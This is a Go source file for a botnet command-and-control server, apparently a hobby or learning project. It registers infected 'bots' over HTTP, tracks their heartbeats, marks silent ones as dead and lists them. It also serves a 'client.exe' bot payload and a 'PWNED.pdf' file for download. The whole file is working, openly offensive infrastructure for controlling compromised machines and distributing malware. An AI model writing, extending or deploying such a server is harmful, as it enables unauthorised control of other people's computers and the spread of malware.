package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
	"sync"
	"time"
)

// temporary directory location
//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")

var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")

type bot struct {
	Id     string `json:"bot_id"`
	Status string `json:"status"`
}

type botstatus struct {
	Status   string
	Lastseen time.Time
}

type botmap map[string]botstatus

var m = make(botmap)

func showbots(res http.ResponseWriter, req *http.Request) {
	for k, v := range m {
		_, err := fmt.Fprintf(res, "%s, %s,", k, v.Status)
		if err != nil {
			return
		}
		fmt.Fprintln(res, " ", v.Lastseen.UTC())

	}
}

func register(rw http.ResponseWriter, req *http.Request) {
	var b bot
	var bs botstatus

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	_, ok := m[b.Id]
	if ok {
		fmt.Printf("Bot %s reconnected!\n", b.Id)
		bs.Status = b.Status
		bs.Lastseen = time.Now()
		m[b.Id] = bs
	} else {
		bs.Status = b.Status
		bs.Lastseen = time.Now()
		m[b.Id] = bs

		fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
		fmt.Println("Time registered: ", bs.Lastseen.UTC())
		_, err = fmt.Fprintf(rw, "Registered!\n")
		if err != nil {
			return
		}
	}

}

func heartbeat(res http.ResponseWriter, req *http.Request) {
	var b bot
	var bs botstatus

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(res, err.Error(), http.StatusBadRequest)
		return
	}
	bs.Status = b.Status
	bs.Lastseen = time.Now()

	m[b.Id] = bs

	//fmt.Printf("heartbeat from %s", b.Id)
	//fmt.Println(" at ", bs.Lastseen.UTC())
}

func statusupdater() {
	var bs botstatus
	for true {
		if len(m) > 0 {
			time.Sleep(time.Second)
			for k, v := range m {
				start := v.Lastseen
				end := time.Now()
				diff := end.Sub(start)
				//fmt.Println("difference in seconds is ", diff.Seconds())
				if diff.Seconds() > 4 {
					bs.Status = "dead"
					bs.Lastseen = v.Lastseen
					m[k] = bs
				}
			}
		}
	}
}

func pdfserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
}

func clientserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
}

func main() {
	mux := http.NewServeMux()

	fmt.Printf("Starting server at port 8081\n")

	pdf := http.HandlerFunc(pdfserver)
	mux.Handle("/pdf", pdf)

	reg := http.HandlerFunc(register)
	mux.Handle("/register", reg)

	client := http.HandlerFunc(clientserver)
	mux.Handle("/client", client)

	showb := http.HandlerFunc(showbots)
	mux.Handle("/showbots", showb)

	hbeat := http.HandlerFunc(heartbeat)
	mux.Handle("/heartbeat", hbeat)

	wg := new(sync.WaitGroup)

	wg.Add(2)

	log.Println("Listening...")

	go func() {
		log.Fatal(http.ListenAndServe("localhost:8081", mux))
		wg.Done()
	}()

	go func() {
		statusupdater()
		wg.Done()
	}()

	wg.Wait()

}
